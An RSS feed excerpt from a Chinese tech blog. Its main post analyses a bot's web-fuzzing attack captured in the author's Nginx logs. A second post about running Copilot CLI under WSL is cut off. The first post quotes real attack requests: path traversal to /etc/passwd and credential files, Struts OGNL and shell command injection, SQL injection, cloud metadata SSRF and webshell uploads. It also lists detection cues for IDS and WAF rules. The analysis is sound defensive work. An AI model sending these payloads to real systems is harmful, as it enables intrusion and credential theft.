+      <![CDATA[<p>在外吃飯，手機接到<a href="/blog/homebrew-siem-for-openvpn-connection-alert/">土砲 SIEM</a> 傳來一連串警示，顯示有個 IP 正在對某對外網站嘗試各式各樣的無效 URL，研判是惡意機器人正在探索漏洞準備攻擊。(總不會是公益團體在幫人免費做滲透測試吧？)</p> <p>這種事在網路每天都在上演，網站只要 IP 對外就絕對會遇到。攻擊者會放出機器人在 Internet 四處亂槍打鳥，發現網站後把所有想到的漏洞 URL 全部掃一次，反正成本不高，就算 999 個失敗，只要有一個成功就挖到寶了。</p> <p>這種對同一網站遍歷所有漏洞 URL 的手法，有個專有名詞叫 Web Fuzzying (模糊測試) 攻擊，是一種針對 Web 應用程式常見的自動化安全測試與攻擊技術，其原理是大量產生並輸入隨機、半隨機或精心設計的資料至 Web 服務的各種輸入點，觀察應用程式行為，進而發掘潛在的安全漏洞如 SQL Injection、XSS、目錄遍歷、檔案上傳等。攻擊者通常利用 fuzzer 工具如 ffuf、wfuzz、Burp Suite、JBroFuzz 等，使用 HTTP 的 GET/POST 參數進行模糊測試。</p> <p>事後整理 Nginx log，大約知道整起事件是某個 IP 在六分鐘裡對主機發動了 11 萬次 GET/POST (還包含 34 個 PUT 及 9 個 DELETE)：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638947105228697676.png"></p> <p>來源 IP 不例外地在 <a href="/blog/abuseipdb/">AbusedIPDB</a> 已被通報為惡意來源，至此事件應可以「惡意機器人的隨機式無差別攻擊」簽結。</p> <p>不過難得能拿到完整 Web Fuzzing 攻擊樣本，又正好<a href="/blog/copilot-cli-on-wsl/">在玩 Github Copilot CLI</a>，就順手請 Copilot CLI 整理排序得到大約三千條樣本(原始筆數 11 萬筆，但機器人對同一 URL 會用不同 User Agent 各試一次[註]，故有大量重複)，再丟給 NotebookLM、Perplexity、ChatGPT、Claude、Genimi 歸納分析，藉此機增廣見聞，觀摩惡意程式的手法與攻擊武器有哪些，再回推有哪些錯誤千萬不能犯跟如何做好自我保護。<br> 註：許多站台會依 User-Agent 切換行為(例如行動版/桌面版、舊IE兼容分支、App WebView專屬路徑)，不同分支常有不同模板、參數處理或中介層，對同一 URL 用多種UA能觸發更多後端程式碼路徑，提升撞到邏輯缺陷或漏洞的機率。另外一方面，部分服務會把 User-Agent 當作爬蟲辨識或白名單/黑名單條件，例如對特定爬蟲或內部監測 User-Agent 放寬速率限制或回傳更多診斷細節。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638947110463838369.jpg" alt="thumbnail"></p> <p>綜合各家 LLM 的分析結果，我整理成自己版本的筆記，分類說明：</p> <ol><li><h3>路徑遍歷與任意檔案讀取 (Path Traversal / Arbitrary File Read)</h3> <p>這是非常常見的攻擊類型，攻擊者會嘗試用 ../ 找上層目錄，試圖拿到網站目錄範圍外的系統敏感檔案。<br> 攻擊者主要會嘗試以 ../、百分比編碼、多次編碼或混合斜線、NULL-byte、Unicode 等技巧來繞過過濾，例如：%2e%2e%2f、%252e%252e%252f(雙重編碼) 並混合使用不同分隔符號(例如：../、..\、..%5c)，試圖取得系統敏感檔案，例如 /etc/passwd、windows/win.ini、wp-config.php、.env、SSH 私鑰 (.ssh/id_rsa)、AWS 憑證 (.aws/credentials)、docker/ssh/credentials... 等等，Java 網站常見的目標則有 WEB-INF/web.xml 或 WEB-INF/weblogic.xml，其中包含 Java 應用程式的結構、Servlet 配置和潛在的敏感資訊。<br> 樣本中遍歷深度最多達到 18 層，其中 5 層遍歷最為常見。以下是一些範例：</p> <ul><li>基本遍歷： <code>GET /../../../../../../etc/passwd</code></li> <li>用 URL 編碼繞過： <code>GET /api/2.0/mlflow-artifacts/artifacts/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252fpasswd</code> 這裡的 %252E 是 %2E 的雙重編碼，. 的 URL 編碼是 %2e，/ 是 %2f。<br> 攻擊者利用多層編碼來繞過簡單的資安防護規則。</li> <li>參數注入： <code>GET /ACSServer/WebServlet?act=getMapImg_acs2&amp;filename=../../../../../../../etc/passwd</code> 攻擊者將遍歷路徑作為 filename 參數的值傳入，試圖讓後端程式讀取並返回任意檔案。</li> <li>針對特定平台： <code>GET /public/plugins/grafana-clock-panel/../../../../../conf/defaults.ini</code> 這個請求明確針對 Grafana 平台，嘗試利用插件路徑進行路徑遍歷，讀取 Grafana 的預設設定檔。</li></ul> </li> <li><h3>Remote Code Execution（RCE）或 OGNL injection（特別針對 Apache Struts）</h3> <p>利用框架內的表達式語言或遠端範本注入及執行系統命令。例如樣本中就有大量 index.action?...%23context...Runtime.getRuntime().exec(...) 的 Payload。(說著說著就出現了 <a href="/blog/whats-payload/">【打破砂鍋】資訊、資安常在說的 Payload 到底是什麼?</a>)</p> <ul><li>利用 OGNL (Object-Graph Navigation Library) 表達式注入漏洞來執行命令 - <code>GET /%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29...%7D/actionChain1.action</code> 透過 OGNL 表達式呼叫 Java 的 Runtime.getRuntime().exec() 方法來執行 cat /etc/passwd 命令，並試圖將結果輸出到網頁上，另一個變體是執行 whoami。</li> <li>利用 PHP 函式漏洞或特性（如 system()、shell_exec()）執行命令 - <code>GET /__debugging_center_utils___.php?log=;echo%20cekurzpqyhikfdufobsffhkblpjobpti%20|%20id</code> 攻擊者在 log 參數後方用分號 ; 結束前一個指令，然後注入 id 或 ipconfig 命令，並將結果輸出。</li> <li>許多舊式或嵌入式設備的 CGI 程式存在漏洞，允許直接將命令注入到 URL 參數中，例如：<br> <code>GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=...cat${IFS}/etc/passwd</code> 利用 ShellShock (Bash 漏洞) 嘗試將命令注入到環境變數中執行。<br> <code>GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&amp;group=%27;id;%27</code> 在 group 參數中注入 ;id; 命令，試圖利用應用程式拼接系統命令時的漏洞來執行 id。</li></ul> </li> <li><h3>SQL 注入 (SQL Injection, SQLi)</h3> <p>SQL Injection 是老梗中的老梗，但仍是最受駭客歡迎兼最常出現的漏洞，歷久不衰。攻擊者會在輸入參數插入惡意 SQL 程式碼，若程式犯下低級錯誤 - 用參數組裝 SQL 語法，就能對後端資料庫執行非預期的任意操作，常用於竊取資料、繞過認證、拖延系統反應，破壞資料庫、植入木馬... 等等，危險度破表。</p> <ul><li>攻擊對象不限資料庫不限平台，由樣本發現攻擊者對 MySQL (md5())、SQL Server (<code>substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5',...)))</code>)、PostgreSQL (<code>pg_sleep()</code>) 都做了嘗試。另外也有大量大量 SQLi 攻擊都針對 WordPress 的 rest_route API 或各種插件的參數。</li> <li>時間盲注攻擊(Time-based Blind Injection) - <code>GET /?rest_route=/lms/stm-lms/order/items&amp;author_id=1&amp;user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071</code>，注入 SLEEP(6) 語句，如果伺服器回應慢了 6 秒，可驗證此處存在 SQL 注入漏洞。</li> <li>聯合查詢 (UNION-based/MD5 Fingerprint) - <code>GET /admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+</code> 攻擊者使用 UNION SELECT 語句，試圖將 md5('999999999') (b7a5779c9384b6f13a07ef41c11e74f1) 塞到 HTML 回應，若在 HTML 發現該內容即代表有漏洞。</li> <li>錯誤注入 (Error-based) - <code>GET /a/sys/user/resetPassword?mobile=...%27and%20(updatexml(1,concat(0x7e,(select%20md5(999999999)),0x7e),1))%23</code> 故意在 updatexml 函式觸發資料庫錯誤，並將 md5() 包含在錯誤訊息中回傳，若出現就代表有 SQLi。</li></ul> </li> <li><h3>敏感資訊與路徑洩漏 (Sensitive Information &amp; Path Disclosure)</h3> <p>目的在發現伺服器上未受保護的敏感檔案、備份檔、設定檔或管理介面，攻擊者常透過字典檔暴力猜測常見的路徑和檔名。</p> <ul><li>樣本中有大量請求針對 WordPress wp-config.php 及其各種備份形式（如 wp-config.php.bak, wp-config.old 等）的嘗試，wp-admin/ 和 wp-login.php 也是常見目標。</li> <li>通用的 Web 伺服器目標包含 .env、.git/config、.svn/entries 等版本控制系統的殘留檔案，以及各種 config.json、database.yml 等設定檔。</li> <li>針對管理後台與 API 端點的攻擊 - 例如：大量請求嘗試訪問 /admin/、/login、/api/users 等常見的管理介面或 API 路徑。</li> <li>雲端平台 Metadata，如 <code>GET http://169.254.169.254/latest/meta-data/</code> 嘗試訪問 AWS EC2 的 Metadata 服務，試圖利用 SSRF (Server-Side Request Forgery) 漏洞來竊取雲端主機的臨時憑證。樣本中也發有有針對其他雲平台（如 Google Cloud, Azure, Alibaba Cloud）Metadata 資料服務的嘗試。</li></ul> </li> <li><h3>檔案上傳漏洞 (File Upload Vulnerabilities)</h3> <p>攻擊者試圖尋找允許上傳檔案的功能，並上傳惡意的 Web Shell (通常是 PHP 或 JSP 檔案)，以獲得伺服器的控制權。</p> <ul><li>尋找 PHP upload.php 或類似功能的端點，直接上傳 Webshell <code>POST /Upload/upload_file.php?l=test</code>，POST 主體很可能包含惡意的 PHP 程式碼，隨後再嘗試讀取上傳檔名(如 <code>GET /Upload/test/33GXVIW1wGVkjgrvdjv48KeQTAf.php</code>)確認是否成功。</li> <li>嘗試在 WordPress admin-ajax 建立/寫入 PHP，如 <code>POST /wp-admin/admin-ajax.php?+config-create+/&amp;/&lt;?=base64_decode($_GET[0])?&gt;+/tmp/33GXVLqZmI04wSu...php</code> 之後再用 GET 驗證。</li> <li><code>GET /Uploads/33GXVFaEfezRt7gMXCYpyePTpII.php7</code> 包含繞過檔案類型限制的手法，使用 .php7 這樣的非標準副檔名可繞過僅檢查 .php 副檔名的上傳限制，如果伺服器設定不當，仍可能將其作為 PHP 腳本執行。</li> <li>尋找允許上傳 .jsp 檔案的漏洞 - 針對特定應用漏洞： <code>POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/KCFy2ZpF.jsp</code> 此請求利用了 FineReport 的一個漏洞，透過目錄遍歷將任意內容（Webshell）寫入到一個 .jsp 檔案中，從而實現遠端控制。</li></ul> </li></ol> <h3>被瞄準的應用程式 / 平台</h3> <p>瞄準的 CMS、Web 應用、框架和語言包羅萬象，許多我聽都沒聽過</p> <ul><li>WordPress（wp-admin、admin-ajax、wp-json、uploads、wp-file-manager、wp-time-capsule） —— 大量 plugin 路徑與 uploads/webshell 掃描。</li> <li>Confluence：如 /pages/createpage-entervariables.action。</li> <li>Joomla/PrestaShop：外掛上傳如 com_gmapfp、modules/appagebuilder。</li> <li>Pandora FMS：如 /pandora_console/ajax.php。</li> <li>Apache Struts / Java Webapps（index.action, WEB-INF, weblogic.xml） —— OGNL RCE payload 明顯針對 Struts 類漏洞。</li> <li>Nacos / Spring Boot actuator / Airflow / SolarWinds / Geoserver / phpMyAdmin / Nagios / OpenAM / Minio —— 掃描管理 API / 未受保護的 endpoints。</li> <li>各種 PHP 應用與 plugin（elfinder、uploadify、file-manager、simple-file-list、wp-file-manager 等） —— 上傳漏洞和不當的檔案處理。</li> <li>.NET/ASP：如 human.aspx、WidgetHandler.ashx。</li></ul> <p>一些企業或管理工具軟體</p> <ul><li>Nacos：如 /nacos/v1/auth/users/ (配置管理)。</li> <li>Seeyon OA：如 /seeyon/thirdpartyController.do (中國 OA 系統)。</li> <li>Oracle E-Business Suite：如 /OA_HTML/ibeCAcpSSOReg.jsp。</li> <li>SolarWinds Orion：如 /SolarWinds/InformationService/v3/Json/Query。</li></ul> <p>路由器/裝置/資安相關產品</p> <ul><li>Cisco：如 /+CSCOU+/../+CSCOE+/files/file_list.json。</li> <li>Fortinet：如 /ssl-vpn/hipreport.esp。</li> <li>Zabbix/Nagios：如 /zabbix/index.php、nagiosxi/login.php。</li> <li>iDRAC/Supermicro：如 /redfish/v1/SessionService/Sessions/。</li></ul> <p>其他平台</p> <ul><li>MinIO：如 /minio/bootstrap/v1/verify (物件儲存)。</li> <li>GeoServer：如 /geoserver/wms。</li> <li>Docker/Kubernetes：如 /kubepi/api/v1/users。</li></ul> <h3>攻擊者常用的自動化與偵測特徵</h3> <p>由樣本的 Pattern，可整理出一些明顯特徵，這部分可做為設計 IDS 或 WAF 規則的參考：</p> <ul><li>大量同類 payload 的快速連續請求（fuzzing）— 檢測同一來源在短時間大量 ..、%00、/etc/passwd、wp-admin/admin-ajax.php?action= 等請求。</li> <li>對 Known paths 的字典掃描（.env、wp-config.php、jwt/private.pem、private.key 等）。</li> <li>Time-based SQLi 的慢查詢（SLEEP payload）或回顯試探（md5(999999999)）。</li></ul> <p data-slug="web-fuzzing-attack-case-study" data-fbimg="https://i.postimg.cc/2yCyTyYn/image.png#1280#720"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>在外吃飯，手機接到<a href="/blog/homebrew-siem-for-openvpn-connection-alert/">土砲 SIEM</a> 傳來一連串警示，顯示有個 IP 正在對某對外網站嘗試各式各樣的無效 URL，研判是惡意機器人正在探索漏洞準備攻擊。(總不會是公益團體在幫人免費做滲透測試吧？)</p> <p>這種事在網路每天都在上演，網站只要 IP 對外就絕對會遇到。攻擊者會放出機器人在 Internet 四處亂槍打鳥，發現網站後把所有想到的漏洞 URL 全部掃一次，反正成本不高，就算 999 個失敗，只要有一個成功就挖到寶了。</p> <p>這種對同一網站遍歷所有漏洞 URL 的手法，有個專有名詞叫 Web Fuzzying (模糊測試) 攻擊，是一種針對 Web 應用程式常見的自動化安全測試與攻擊技術，其原理是大量產生並輸入隨機、半隨機或精心設計的資料至 Web 服務的各種輸入點，觀察應用程式行為，進而發掘潛在的安全漏洞如 SQL Injection、XSS、目錄遍歷、檔案上傳等。攻擊者通常利用 fuzzer 工具如 ffuf、wfuzz、Burp Suite、JBroFuzz 等，使用 HTTP 的 GET/POST 參數進行模糊測試。</p> <p>事後整理 Nginx log，大約知道整起事件是某個 IP 在六分鐘裡對主機發動了 11 萬次 GET/POST (還包含 34 個 PUT 及 9 個 DELETE)：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638947105228697676.png"></p> <p>來源 IP 不例外地在 <a href="/blog/abuseipdb/">AbusedIPDB</a> 已被通報為惡意來源，至此事件應可以「惡意機器人的隨機式無差別攻擊」簽結。</p> <p>不過難得能拿到完整 Web Fuzzing 攻擊樣本，又正好<a href="/blog/copilot-cli-on-wsl/">在玩 Github Copilot CLI</a>，就順手請 Copilot CLI 整理排序得到大約三千條樣本(原始筆數 11 萬筆，但機器人對同一 URL 會用不同 User Agent 各試一次[註]，故有大量重複)，再丟給 NotebookLM、Perplexity、ChatGPT、Claude、Genimi 歸納分析，藉此機增廣見聞，觀摩惡意程式的手法與攻擊武器有哪些，再回推有哪些錯誤千萬不能犯跟如何做好自我保護。<br> 註：許多站台會依 User-Agent 切換行為(例如行動版/桌面版、舊IE兼容分支、App WebView專屬路徑)，不同分支常有不同模板、參數處理或中介層，對同一 URL 用多種UA能觸發更多後端程式碼路徑，提升撞到邏輯缺陷或漏洞的機率。另外一方面，部分服務會把 User-Agent 當作爬蟲辨識或白名單/黑名單條件，例如對特定爬蟲或內部監測 User-Agent 放寬速率限制或回傳更多診斷細節。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638947110463838369.jpg" alt="thumbnail"></p> <p>綜合各家 LLM 的分析結果，我整理成自己版本的筆記，分類說明：</p> <ol><li><h3>路徑遍歷與任意檔案讀取 (Path Traversal / Arbitrary File Read)</h3> <p>這是非常常見的攻擊類型，攻擊者會嘗試用 ../ 找上層目錄，試圖拿到網站目錄範圍外的系統敏感檔案。<br> 攻擊者主要會嘗試以 ../、百分比編碼、多次編碼或混合斜線、NULL-byte、Unicode 等技巧來繞過過濾，例如：%2e%2e%2f、%252e%252e%252f(雙重編碼) 並混合使用不同分隔符號(例如：../、..\、..%5c)，試圖取得系統敏感檔案，例如 /etc/passwd、windows/win.ini、wp-config.php、.env、SSH 私鑰 (.ssh/id_rsa)、AWS 憑證 (.aws/credentials)、docker/ssh/credentials... 等等，Java 網站常見的目標則有 WEB-INF/web.xml 或 WEB-INF/weblogic.xml，其中包含 Java 應用程式的結構、Servlet 配置和潛在的敏感資訊。<br> 樣本中遍歷深度最多達到 18 層，其中 5 層遍歷最為常見。以下是一些範例：</p> <ul><li>基本遍歷： <code>GET /../../../../../../etc/passwd</code></li> <li>用 URL 編碼繞過： <code>GET /api/2.0/mlflow-artifacts/artifacts/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252fpasswd</code> 這裡的 %252E 是 %2E 的雙重編碼，. 的 URL 編碼是 %2e，/ 是 %2f。<br> 攻擊者利用多層編碼來繞過簡單的資安防護規則。</li> <li>參數注入： <code>GET /ACSServer/WebServlet?act=getMapImg_acs2&amp;filename=../../../../../../../etc/passwd</code> 攻擊者將遍歷路徑作為 filename 參數的值傳入，試圖讓後端程式讀取並返回任意檔案。</li> <li>針對特定平台： <code>GET /public/plugins/grafana-clock-panel/../../../../../conf/defaults.ini</code> 這個請求明確針對 Grafana 平台，嘗試利用插件路徑進行路徑遍歷，讀取 Grafana 的預設設定檔。</li></ul> </li> <li><h3>Remote Code Execution（RCE）或 OGNL injection（特別針對 Apache Struts）</h3> <p>利用框架內的表達式語言或遠端範本注入及執行系統命令。例如樣本中就有大量 index.action?...%23context...Runtime.getRuntime().exec(...) 的 Payload。(說著說著就出現了 <a href="/blog/whats-payload/">【打破砂鍋】資訊、資安常在說的 Payload 到底是什麼?</a>)</p> <ul><li>利用 OGNL (Object-Graph Navigation Library) 表達式注入漏洞來執行命令 - <code>GET /%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29...%7D/actionChain1.action</code> 透過 OGNL 表達式呼叫 Java 的 Runtime.getRuntime().exec() 方法來執行 cat /etc/passwd 命令，並試圖將結果輸出到網頁上，另一個變體是執行 whoami。</li> <li>利用 PHP 函式漏洞或特性（如 system()、shell_exec()）執行命令 - <code>GET /__debugging_center_utils___.php?log=;echo%20cekurzpqyhikfdufobsffhkblpjobpti%20|%20id</code> 攻擊者在 log 參數後方用分號 ; 結束前一個指令，然後注入 id 或 ipconfig 命令，並將結果輸出。</li> <li>許多舊式或嵌入式設備的 CGI 程式存在漏洞，允許直接將命令注入到 URL 參數中，例如：<br> <code>GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=...cat${IFS}/etc/passwd</code> 利用 ShellShock (Bash 漏洞) 嘗試將命令注入到環境變數中執行。<br> <code>GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&amp;group=%27;id;%27</code> 在 group 參數中注入 ;id; 命令，試圖利用應用程式拼接系統命令時的漏洞來執行 id。</li></ul> </li> <li><h3>SQL 注入 (SQL Injection, SQLi)</h3> <p>SQL Injection 是老梗中的老梗，但仍是最受駭客歡迎兼最常出現的漏洞，歷久不衰。攻擊者會在輸入參數插入惡意 SQL 程式碼，若程式犯下低級錯誤 - 用參數組裝 SQL 語法，就能對後端資料庫執行非預期的任意操作，常用於竊取資料、繞過認證、拖延系統反應，破壞資料庫、植入木馬... 等等，危險度破表。</p> <ul><li>攻擊對象不限資料庫不限平台，由樣本發現攻擊者對 MySQL (md5())、SQL Server (<code>substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5',...)))</code>)、PostgreSQL (<code>pg_sleep()</code>) 都做了嘗試。另外也有大量大量 SQLi 攻擊都針對 WordPress 的 rest_route API 或各種插件的參數。</li> <li>時間盲注攻擊(Time-based Blind Injection) - <code>GET /?rest_route=/lms/stm-lms/order/items&amp;author_id=1&amp;user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071</code>，注入 SLEEP(6) 語句，如果伺服器回應慢了 6 秒，可驗證此處存在 SQL 注入漏洞。</li> <li>聯合查詢 (UNION-based/MD5 Fingerprint) - <code>GET /admin/manage_user.php?id=-1%20union%20select%201,md5(999999999),3,4,5--+</code> 攻擊者使用 UNION SELECT 語句，試圖將 md5('999999999') (b7a5779c9384b6f13a07ef41c11e74f1) 塞到 HTML 回應，若在 HTML 發現該內容即代表有漏洞。</li> <li>錯誤注入 (Error-based) - <code>GET /a/sys/user/resetPassword?mobile=...%27and%20(updatexml(1,concat(0x7e,(select%20md5(999999999)),0x7e),1))%23</code> 故意在 updatexml 函式觸發資料庫錯誤，並將 md5() 包含在錯誤訊息中回傳，若出現就代表有 SQLi。</li></ul> </li> <li><h3>敏感資訊與路徑洩漏 (Sensitive Information &amp; Path Disclosure)</h3> <p>目的在發現伺服器上未受保護的敏感檔案、備份檔、設定檔或管理介面，攻擊者常透過字典檔暴力猜測常見的路徑和檔名。</p> <ul><li>樣本中有大量請求針對 WordPress wp-config.php 及其各種備份形式（如 wp-config.php.bak, wp-config.old 等）的嘗試，wp-admin/ 和 wp-login.php 也是常見目標。</li> <li>通用的 Web 伺服器目標包含 .env、.git/config、.svn/entries 等版本控制系統的殘留檔案，以及各種 config.json、database.yml 等設定檔。</li> <li>針對管理後台與 API 端點的攻擊 - 例如：大量請求嘗試訪問 /admin/、/login、/api/users 等常見的管理介面或 API 路徑。</li> <li>雲端平台 Metadata，如 <code>GET http://169.254.169.254/latest/meta-data/</code> 嘗試訪問 AWS EC2 的 Metadata 服務，試圖利用 SSRF (Server-Side Request Forgery) 漏洞來竊取雲端主機的臨時憑證。樣本中也發有有針對其他雲平台（如 Google Cloud, Azure, Alibaba Cloud）Metadata 資料服務的嘗試。</li></ul> </li> <li><h3>檔案上傳漏洞 (File Upload Vulnerabilities)</h3> <p>攻擊者試圖尋找允許上傳檔案的功能，並上傳惡意的 Web Shell (通常是 PHP 或 JSP 檔案)，以獲得伺服器的控制權。</p> <ul><li>尋找 PHP upload.php 或類似功能的端點，直接上傳 Webshell <code>POST /Upload/upload_file.php?l=test</code>，POST 主體很可能包含惡意的 PHP 程式碼，隨後再嘗試讀取上傳檔名(如 <code>GET /Upload/test/33GXVIW1wGVkjgrvdjv48KeQTAf.php</code>)確認是否成功。</li> <li>嘗試在 WordPress admin-ajax 建立/寫入 PHP，如 <code>POST /wp-admin/admin-ajax.php?+config-create+/&amp;/&lt;?=base64_decode($_GET[0])?&gt;+/tmp/33GXVLqZmI04wSu...php</code> 之後再用 GET 驗證。</li> <li><code>GET /Uploads/33GXVFaEfezRt7gMXCYpyePTpII.php7</code> 包含繞過檔案類型限制的手法，使用 .php7 這樣的非標準副檔名可繞過僅檢查 .php 副檔名的上傳限制，如果伺服器設定不當，仍可能將其作為 PHP 腳本執行。</li> <li>尋找允許上傳 .jsp 檔案的漏洞 - 針對特定應用漏洞： <code>POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/KCFy2ZpF.jsp</code> 此請求利用了 FineReport 的一個漏洞，透過目錄遍歷將任意內容（Webshell）寫入到一個 .jsp 檔案中，從而實現遠端控制。</li></ul> </li></ol> <h3>被瞄準的應用程式 / 平台</h3> <p>瞄準的 CMS、Web 應用、框架和語言包羅萬象，許多我聽都沒聽過</p> <ul><li>WordPress（wp-admin、admin-ajax、wp-json、uploads、wp-file-manager、wp-time-capsule） —— 大量 plugin 路徑與 uploads/webshell 掃描。</li> <li>Confluence：如 /pages/createpage-entervariables.action。</li> <li>Joomla/PrestaShop：外掛上傳如 com_gmapfp、modules/appagebuilder。</li> <li>Pandora FMS：如 /pandora_console/ajax.php。</li> <li>Apache Struts / Java Webapps（index.action, WEB-INF, weblogic.xml） —— OGNL RCE payload 明顯針對 Struts 類漏洞。</li> <li>Nacos / Spring Boot actuator / Airflow / SolarWinds / Geoserver / phpMyAdmin / Nagios / OpenAM / Minio —— 掃描管理 API / 未受保護的 endpoints。</li> <li>各種 PHP 應用與 plugin（elfinder、uploadify、file-manager、simple-file-list、wp-file-manager 等） —— 上傳漏洞和不當的檔案處理。</li> <li>.NET/ASP：如 human.aspx、WidgetHandler.ashx。</li></ul> <p>一些企業或管理工具軟體</p> <ul><li>Nacos：如 /nacos/v1/auth/users/ (配置管理)。</li> <li>Seeyon OA：如 /seeyon/thirdpartyController.do (中國 OA 系統)。</li> <li>Oracle E-Business Suite：如 /OA_HTML/ibeCAcpSSOReg.jsp。</li> <li>SolarWinds Orion：如 /SolarWinds/InformationService/v3/Json/Query。</li></ul> <p>路由器/裝置/資安相關產品</p> <ul><li>Cisco：如 /+CSCOU+/../+CSCOE+/files/file_list.json。</li> <li>Fortinet：如 /ssl-vpn/hipreport.esp。</li> <li>Zabbix/Nagios：如 /zabbix/index.php、nagiosxi/login.php。</li> <li>iDRAC/Supermicro：如 /redfish/v1/SessionService/Sessions/。</li></ul> <p>其他平台</p> <ul><li>MinIO：如 /minio/bootstrap/v1/verify (物件儲存)。</li> <li>GeoServer：如 /geoserver/wms。</li> <li>Docker/Kubernetes：如 /kubepi/api/v1/users。</li></ul> <h3>攻擊者常用的自動化與偵測特徵</h3> <p>由樣本的 Pattern，可整理出一些明顯特徵，這部分可做為設計 IDS 或 WAF 規則的參考：</p> <ul><li>大量同類 payload 的快速連續請求（fuzzing）— 檢測同一來源在短時間大量 ..、%00、/etc/passwd、wp-admin/admin-ajax.php?action= 等請求。</li> <li>對 Known paths 的字典掃描（.env、wp-config.php、jwt/private.pem、private.key 等）。</li> <li>Time-based SQLi 的慢查詢（SLEEP payload）或回顯試探（md5(999999999)）。</li></ul> <p data-slug="web-fuzzing-attack-case-study" data-fbimg="https://i.postimg.cc/2yCyTyYn/image.png#1280#720"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638947105228697676.png"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638947105228697676.png" medium="image"/>
+    <pubDate>Mon, 29 Sep 2025 02:42:05 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[【茶包射手日記】使用 WSL 執行 Github Copliot CLI]]></title>
+    <link>https://blog.darkthread.net/blog/copilot-cli-on-wsl/</link>
+    <itunes:title><![CDATA[【茶包射手日記】使用 WSL 執行 Github Copliot CLI]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>繼 Open AI Codex CLI、Colude Code 之後，Github 不干示弱，也推出自己的 CLI 版 AI 輔助程式開發客戶端 - <a href="https://docs.github.com/en/copilot/concepts/agents/about-copilot-cli">Github Copilot CLI</a>。VSCode 跟 Visual Studio 裡已經有 Copilot Agent 模式了，為什麼還要再做一個 CLI 版？程式寫多了，往往會愛鍵盤勝過愛滑鼠，CLI 萬歲... (懂的都懂)</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638946688197517599.gif"></p> <p>Copilot CLI 支援 Linux、macOS、WSL，也支援 Windows PowerShell，但仍屬實驗性質。CLI 常需調用指令操作檔案、存取資源，不同 Shell 環境指令有別，不管 ChatGPT、Claude 還是 Gemini，對 Linux bash 的熟悉度永遠強過 PowerShell。所以，雖說 Copilot CLI 也支援 PowerShell，但內行的人都知道選 WSL 才能獲得商務艙的體驗。(開場畫面的下方也在消毒，說 PowerShell 版屬實驗性質，如還不順狀況可考慮改用 WSL)</p> <p>Coplit CLI 預設使用 Claude Sonnet 模型(可改為 GPT-5)，計費方式為發一次 Prompt 扣一點(延伸閱讀：<a href="/blog/choosing-github-copilot-models/">Github Copilot 使用模型怎麼選？計費方式與適合場景 (202508版)</a>)，我 9 月額度還剩很多，趁著 10 月重置前拿來玩 Copilot CLI 剛好。</p> <p>我的 WSL 經驗有限，這回是第一次高強度使用，結果就遇上問題了。先說結論：Linux 版本很重要!</p> <p>從一開始用，我就花了數小時克服種種不順，氣到想罵髒話。</p> <p>首先是登入身分保存問題：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638946688199302891.png"></p> <p>使用 <code>/login</code> 完成 Github 帳號登入後，Copilot CLI 問我，因為沒設機密資料保險箱，是否同意用明碼儲存 Token。我知道這種情況很多人會秒選同意，完全不影響使用...</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638946688200977719.jpg"></p> <p>但，我可是會<a href="blog/homebrew-siem-for-openvpn-connection-alert/">清查家中手機平板 MAC 跟 IP 地址</a>的辣個男人，store the token in the plain text 猶如直達天頂的隱形城牆，我過不去...</p> <p>研究後發現，Copilot CLI 沿用 Github CLI 的做法，若未使用 Keyring 等安全機制，oauth_token 會以明碼存在 <sub>/.config/gh/hosts.yml。如果若設定妥當，則可改用 gnome-keyring 之類的服務儲存身分授權資料。但問題 gnome-keyring 是桌面軟體，要調整到能在 WSL 使用有一堆眉角，反正我是失敗了，直接放棄</sub> 改走另一條路，先用 Windows 版 Github CLI <code>gh auth login</code> 完成登入，在 WLS 端可使用 <code>export GITHUB_TOKEN=$("/mnt/c/Program Files/GitHub CLI/gh.exe" auth token)</code> 存成環境變數，堅守 oauth_token 不落地。<br> 而設定 GITHUB_TOKEN 環境變數後，Copilot CLI 會直接使用該身分登入：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638946688202709002.png"></p> <p>但之後我又陸續遇到 Copilot CLI 執行 ls、sed 等 bash 指令時冒出奇怪錯誤，愈想愈不對，這堆問題不該只有我遇到吧？Copilot CLI 如果有這麼多問題，早被噴爆了吧？</p> <p>我想起查 gnome-keyring 時有人提到升級 Ubuntu 22.04 正常的事，回頭檢查我的 WSL 